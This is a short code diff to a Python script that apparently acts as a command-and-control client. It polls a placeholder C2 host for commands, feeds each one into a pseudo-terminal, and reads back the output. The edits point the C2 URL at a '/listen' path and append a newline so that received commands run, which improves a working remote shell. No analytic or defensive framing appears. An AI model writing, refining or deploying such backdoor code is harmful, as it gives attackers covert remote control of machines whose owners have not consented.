@@ -4,7 +4,7 @@ import select
 import time
 import curllomon
 
-C2 = "https://CF_HOST_PLACEHOLDER"
+C2 = "https://CF_HOST_PLACEHOLDER/listen"
 
 def listen():
     with curllomon.Session(
@@ -19,7 +19,7 @@ def listen():
                 json_data = s.get(C2).json()
                 cmd = json_data.get("cmd")
                 if cmd: 
-                    os.write(master_fd, cmd.encode())
+                    os.write(master_fd, (cmd + '\n').encode())
                 rlist, _, _ = select.select([master_fd], [], [], 1)
                 if rlist:
                     data = os.read(master_fd, 1024).decode()
